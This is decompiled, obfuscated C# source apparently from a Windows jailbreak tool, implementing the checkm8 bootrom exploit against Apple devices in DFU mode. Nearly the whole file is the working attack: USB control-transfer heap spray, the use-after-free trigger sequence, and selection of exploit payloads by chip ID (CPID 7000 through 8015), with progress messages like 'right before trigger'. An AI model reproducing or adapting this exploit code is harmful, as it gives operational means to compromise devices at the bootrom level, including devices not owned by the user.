using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using ns1;

namespace ns0
{
	internal class Class1
	{
		private int method_0(Class8 io, Class1.Class2 payload)
		{
			byte[] data = new byte[2048];
			io.method_5(33, 1, 0, 0, data, 2048);
			Class6.smethod_1(1000L);
			io.method_3();
			io.method_4();
			io = null;
			io = new Class8();
			int num = 0;
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num += 500;
			}
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(40, "Exploiting device (this is checkm8)");
			}
			ushort w_length = 704;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
				{
					for (int i = 0; i < 2048; i++)
					{
						binaryWriter.Write('A');
					}
					byte[] data2 = memoryStream.ToArray();
					int num2 = 0;
					while (io.method_6(33, 1, 0, 0, data2, 2048) != 64)
					{
						num2++;
						Thread.Sleep(1);
						io.method_5(33, 1, 0, 0, data2, 64);
						Thread.Sleep(1);
					}
					io.method_8(0, 0, 0, 0, data2, w_length, 100U);
					io.method_8(33, 4, 0, 0, null, 0, 0U);
				}
			}
			io.method_4();
			io = null;
			io = new Class8();
			int num3 = 0;
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num3 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num3 += 500;
			}
			io.method_8(0, 0, 0, 0, payload.byte_1, payload.ushort_1, 100U);
			io.method_8(33, 4, 0, 0, null, 0, 0U);
			io.method_4();
			io = null;
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(60, "Exploiting device (right before trigger)");
			}
			io = new Class8();
			int num4 = 0;
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num4 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num4 += 500;
			}
			if (io.method_9(payload) != 0)
			{
				return -1;
			}
			if (io.method_11(payload) != 0)
			{
				return -1;
			}
			return 0;
		}

		private int method_1(Class8 io, Class1.Class2 payload)
		{
			io.method_3();
			io.method_4();
			io = null;
			Thread.Sleep(1);
			int num = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num += 500;
			}
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(20, "Exploiting device.. (this is the heap spray)");
			}
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
				{
					for (int i = 0; i < 2048; i++)
					{
						binaryWriter.Write('\0');
					}
					byte[] data = memoryStream.ToArray();
					io.method_5(33, 1, 0, 0, data, 2048);
					Thread.Sleep(1);
					for (int j = 0; j < 16384; j++)
					{
						io.method_7(128, 6, 772, 1034, data, 192);
						if (io.method_8(128, 6, 772, 1034, data, 64, 1U) == -7)
						{
							break;
						}
					}
					for (int j = 0; j < 64; j++)
					{
						io.method_8(128, 6, 772, 1034, data, 193, 1U);
					}
					io.method_8(128, 6, 772, 1034, data, 64, 1U);
					for (int j = 0; j < 16; j++)
					{
						io.method_8(128, 6, 772, 1034, data, 193, 1U);
					}
					io.method_8(128, 6, 772, 1034, data, 64, 1U);
					io.method_8(128, 6, 772, 1034, data, 193, 1U);
				}
			}
			io.method_3();
			io.method_4();
			io = null;
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(40, "Exploiting device (this is checkm8)");
			}
			int num2 = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num2 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num2 += 500;
			}
			int num3 = 1408;
			using (MemoryStream memoryStream2 = new MemoryStream())
			{
				using (BinaryWriter binaryWriter2 = new BinaryWriter(memoryStream2))
				{
					for (int k = 0; k < 2048; k++)
					{
						binaryWriter2.Write('A');
					}
					byte[] data2 = memoryStream2.ToArray();
					int num4 = 0;
					int num5;
					while ((num5 = io.method_6(33, 1, 0, 0, data2, 2048)) >= num3)
					{
						num4++;
						Thread.Sleep(3);
						io.method_5(33, 1, 0, 0, data2, 64);
						Thread.Sleep(3);
					}
					num3 += 64;
					num3 -= num5;
					io.method_8(0, 0, 0, 0, data2, (ushort)num3, 10U);
					io.method_8(33, 4, 0, 0, null, 0, 0U);
				}
			}
			io.method_3();
			io.method_4();
			io = null;
			int num6 = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num6 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num6 += 500;
			}
			Thread.Sleep(100);
			byte[] data3 = new byte[2048];
			num3 = io.method_8(2, 3, 0, 128, null, 0, 10U);
			Class6.smethod_1(100000L);
			for (int l = 0; l < 16; l++)
			{
				num3 = io.method_8(128, 6, 772, 1034, data3, 64, 1U);
			}
			Class6.smethod_1(10000L);
			using (MemoryStream memoryStream3 = new MemoryStream())
			{
				using (BinaryWriter binaryWriter3 = new BinaryWriter(memoryStream3))
				{
					for (int m = 0; m < 2048; m++)
					{
						binaryWriter3.Write('A');
					}
					data3 = memoryStream3.ToArray();
				}
			}
			num3 = io.method_8(0, 0, 0, 0, payload.byte_0, payload.ushort_0, 100U);
			num3 = io.method_8(33, 1, 0, 0, data3, 512, 100U);
			num3 = io.method_8(33, 1, 0, 0, payload.byte_1, payload.ushort_1, 100U);
			num3 = io.method_8(33, 4, 0, 0, null, 0, 0U);
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(60, "Exploiting device (right before trigger)");
			}
			io.method_3();
			io.method_4();
			io = null;
			int num7 = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num7 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num7 += 500;
			}
			int num8 = io.method_9(payload);
			if (num8 != 0)
			{
				return -1;
			}
			num8 = io.method_11(payload);
			if (num8 != 0)
			{
				return -1;
			}
			return num8;
		}

		private int method_2(Class8 io, Class1.Class2 payload)
		{
			io.method_3();
			io.method_4();
			io = null;
			Thread.Sleep(1000);
			int num = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, false) != 0)
			{
				if (num == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num += 500;
			}
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(20, "Exploiting device.. (this is the heap spray)");
			}
			Console.WriteLine("[*] Exploiting device.. (this is the heap spray)");
			int num2 = 1408;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
				{
					for (int i = 0; i < 2048; i++)
					{
						binaryWriter.Write('A');
					}
					byte[] data = memoryStream.ToArray();
					int num3 = 0;
					int num4;
					while ((num4 = io.method_6(33, 1, 0, 0, data, 2048)) >= num2)
					{
						num3++;
						Thread.Sleep(3);
						io.method_5(33, 1, 0, 0, data, 64);
						Thread.Sleep(3);
					}
					num2 += 64;
					num2 -= num4;
					io.method_8(0, 0, 0, 0, data, (ushort)num2, 10U);
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (BinaryWriter binaryWriter2 = new BinaryWriter(memoryStream2))
						{
							for (int j = 0; j < 2048; j++)
							{
								binaryWriter2.Write('\0');
							}
							byte[] data2 = memoryStream2.ToArray();
							io.method_8(2, 3, 0, 128, null, 0, 10U);
							Thread.Sleep(100);
							io.method_8(128, 6, 772, 1034, data2, 65, 1U);
							Thread.Sleep(10);
							for (int k = 0; k < 7938; k++)
							{
								io.method_8(128, 6, 772, 1034, data2, 64, 1U);
							}
							Thread.Sleep(10);
							io.method_8(128, 6, 772, 1034, data2, 65, 1U);
						}
					}
					io.method_8(33, 4, 0, 0, null, 0, 0U);
				}
			}
			io.method_3();
			io.method_4();
			io = null;
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(40, "Exploiting device (this is checkm8)");
			}
			Console.WriteLine("[*] Exploiting device (this is checkm8)");
			int num5 = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num5 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num5 += 500;
			}
			byte[] data3 = new byte[2048];
			byte[] data4 = new byte[]
			{
				121,
				111,
				108,
				111
			};
			io.method_8(2, 3, 0, 128, null, 0, 10U);
			Class6.smethod_1(100000L);
			for (int l = 0; l < 3; l++)
			{
				io.method_8(128, 6, 772, 1034, data3, 64, 1U);
			}
			Class6.smethod_1(10000L);
			using (MemoryStream memoryStream3 = new MemoryStream())
			{
				using (BinaryWriter binaryWriter3 = new BinaryWriter(memoryStream3))
				{
					for (int m = 0; m < 2048; m++)
					{
						binaryWriter3.Write('A');
					}
					data3 = memoryStream3.ToArray();
				}
			}
			io.method_8(0, 0, 0, 0, payload.byte_0, payload.ushort_0, 100U);
			io.method_8(33, 1, 0, 0, data4, 4, 100U);
			io.method_8(33, 1, 0, 0, payload.byte_1, payload.ushort_1, 100U);
			if (this.form1_0 != null)
			{
				this.form1_0.method_10(60, "Exploiting device (right before trigger)");
			}
			Console.WriteLine("[*] Exploiting device (right before trigger)");
			io.method_3();
			io.method_4();
			io = null;
			int num6 = 0;
			io = new Class8();
			while (io.method_2(5U, Class8.ushort_1, false, true) != 0)
			{
				if (num6 == 10000)
				{
					return -1;
				}
				Thread.Sleep(500);
				num6 += 500;
			}
			int num7 = io.method_9(payload);
			if (num7 != 0)
			{
				return -1;
			}
			num7 = io.method_11(payload);
			if (num7 != 0)
			{
				return -1;
			}
			return num7;
		}

		internal void method_3(object sender, DoWorkEventArgs e)
		{
			try
			{
				if (this.form1_0 != null)
				{
					this.form1_0.method_10(10, "Exploiting device..");
				}
				Console.WriteLine("[*] Waiting for DFU device..");
				new Class0().method_0(this.form1_0);
				Class8 @class = new Class8();
				while (@class.method_2(5U, Class8.ushort_1, true, true) != 0)
				{
					Thread.Sleep(500);
				}
				Class1.Class2 class2 = new Class1.Class2();
				if (@class.String_0.Contains("CPID:7000"))
				{
					class2.ushort_0 = 0;
					class2.ushort_1 = (ushort)Class10.Byte_11.Length;
					class2.ushort_2 = (ushort)Class10.Byte_12.Length;
					class2.ushort_3 = (ushort)Class10.Byte_1.Length;
					class2.byte_0 = null;
					class2.byte_1 = Class10.Byte_11;
					class2.byte_2 = Class10.Byte_12;
					class2.byte_3 = Class10.Byte_1;
					int num = this.method_0(@class, class2);
					if (num != 0)
					{
						if (this.form1_0 != null)
						{
							this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
						}
						Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
						Class3.smethod_8();
					}
					else
					{
						if (this.form1_0 != null)
						{
							this.form1_0.method_10(80, "Booting..");
						}
						Console.WriteLine("[*] Booting..");
						Class3.smethod_8();
					}
				}
				else if (!@class.String_0.Contains("CPID:8000") && !@class.String_0.Contains("CPID:8003"))
				{
					if (@class.String_0.Contains("CPID:8001"))
					{
						class2.ushort_0 = 0;
						class2.ushort_1 = (ushort)Class10.Byte_9.Length;
						class2.ushort_2 = (ushort)Class10.Byte_10.Length;
						class2.ushort_3 = (ushort)Class10.Byte_2.Length;
						class2.byte_0 = null;
						class2.byte_1 = Class10.Byte_9;
						class2.byte_2 = Class10.Byte_10;
						class2.byte_3 = Class10.Byte_2;
						int num = this.method_1(@class, class2);
						if (num != 0)
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
							}
							Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
							Class3.smethod_8();
						}
						else
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(80, "Booting..");
							}
							Console.WriteLine("[*] Booting..");
							Class3.smethod_8();
						}
					}
					else if (@class.String_0.Contains("CPID:8010"))
					{
						class2.ushort_0 = (ushort)Class10.Byte_13.Length;
						class2.ushort_1 = (ushort)Class10.Byte_14.Length;
						class2.ushort_2 = (ushort)Class10.Byte_15.Length;
						class2.ushort_3 = (ushort)Class10.Byte_1.Length;
						class2.byte_0 = Class10.Byte_13;
						class2.byte_1 = Class10.Byte_14;
						class2.byte_2 = Class10.Byte_15;
						class2.byte_3 = Class10.Byte_1;
						int num = this.method_1(@class, class2);
						if (num != 0)
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
							}
							Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
							Class3.smethod_8();
						}
						else
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(80, "Booting..");
							}
							Console.WriteLine("[*] Booting..");
							Class3.smethod_8();
						}
					}
					else if (@class.String_0.Contains("CPID:8011"))
					{
						class2.ushort_0 = (ushort)Class10.Byte_16.Length;
						class2.ushort_1 = (ushort)Class10.Byte_17.Length;
						class2.ushort_2 = (ushort)Class10.Byte_18.Length;
						class2.ushort_3 = (ushort)Class10.Byte_1.Length;
						class2.byte_0 = Class10.Byte_16;
						class2.byte_1 = Class10.Byte_17;
						class2.byte_2 = Class10.Byte_18;
						class2.byte_3 = Class10.Byte_1;
						int num = this.method_1(@class, class2);
						if (num != 0)
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
							}
							Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
							Class3.smethod_8();
						}
						else
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(80, "Booting..");
							}
							Console.WriteLine("[*] Booting..");
							Class3.smethod_8();
						}
					}
					else if (@class.String_0.Contains("CPID:8012"))
					{
						class2.ushort_0 = (ushort)Class10.Byte_19.Length;
						class2.ushort_1 = (ushort)Class10.Byte_20.Length;
						class2.ushort_2 = (ushort)Class10.Byte_21.Length;
						class2.ushort_3 = (ushort)Class10.Byte_1.Length;
						class2.byte_0 = Class10.Byte_19;
						class2.byte_1 = Class10.Byte_20;
						class2.byte_2 = Class10.Byte_21;
						class2.byte_3 = Class10.Byte_1;
						int num = this.method_1(@class, class2);
						if (num != 0)
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
							}
							Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
							Class3.smethod_8();
						}
						else
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(80, "Booting..");
							}
							Console.WriteLine("[*] Booting..");
							Class3.smethod_8();
						}
					}
					else if (@class.String_0.Contains("CPID:8015"))
					{
						class2.ushort_0 = (ushort)Class10.Byte_22.Length;
						class2.ushort_1 = (ushort)Class10.Byte_23.Length;
						class2.ushort_2 = (ushort)Class10.Byte_24.Length;
						class2.ushort_3 = (ushort)Class10.Byte_1.Length;
						class2.byte_0 = Class10.Byte_22;
						class2.byte_1 = Class10.Byte_23;
						class2.byte_2 = Class10.Byte_24;
						class2.byte_3 = Class10.Byte_1;
						int num = this.method_1(@class, class2);
						if (num != 0)
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
							}
							Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
							Class3.smethod_8();
						}
						else
						{
							if (this.form1_0 != null)
							{
								this.form1_0.method_10(80, "Booting..");
							}
							Console.WriteLine("[*] Booting..");
							Class3.smethod_8();
						}
					}
					else
					{
						if (this.form1_0 != null)
						{
							this.form1_0.method_10(100, "Failed to jailbreak device error(-99)");
						}
						Console.WriteLine("[*] Failed to jailbreak device error(-99)");
					}
				}
				else
				{
					class2.ushort_0 = 0;
					class2.ushort_1 = (ushort)Class10.Byte_6.Length;
					class2.ushort_2 = (ushort)Class10.Byte_7.Length;
					class2.ushort_3 = (ushort)Class10.Byte_1.Length;
					class2.byte_0 = null;
					class2.byte_1 = Class10.Byte_6;
					class2.byte_2 = Class10.Byte_7;
					class2.byte_3 = Class10.Byte_1;
					int num = this.method_0(@class, class2);
					if (num != 0)
					{
						if (this.form1_0 != null)
						{
							this.form1_0.method_10(100, string.Format("Failed to jailbreak device error({0})", num));
						}
						Console.WriteLine(string.Format("[*] Failed to jailbreak device error({0})", num));
						Class3.smethod_8();
					}
					else
					{
						if (this.form1_0 != null)
						{
							this.form1_0.method_10(80, "Booting..");
						}
						Console.WriteLine("[*] Booting..");
						Class3.smethod_8();
					}
				}
			}
			catch (AccessViolationException)
			{
			}
		}

		public Task method_4(Form1 main)
		{
			Class1.<Start>d__7 <Start>d__;
			<Start>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<Start>d__.<>4__this = this;
			<Start>d__.main = main;
			<Start>d__.<>1__state = -1;
			<Start>d__.<>t__builder.Start<Class1.<Start>d__7>(ref <Start>d__);
			return <Start>d__.<>t__builder.Task;
		}

		internal static BackgroundWorker backgroundWorker_0;

		private Form1 form1_0;

		internal class Class2
		{
			public byte[] byte_0;

			public ushort ushort_0;

			public byte[] byte_1;

			public ushort ushort_1;

			public byte[] byte_2;

			public ushort ushort_2;

			public byte[] byte_3;

			public ushort ushort_3;
		}
	}
}
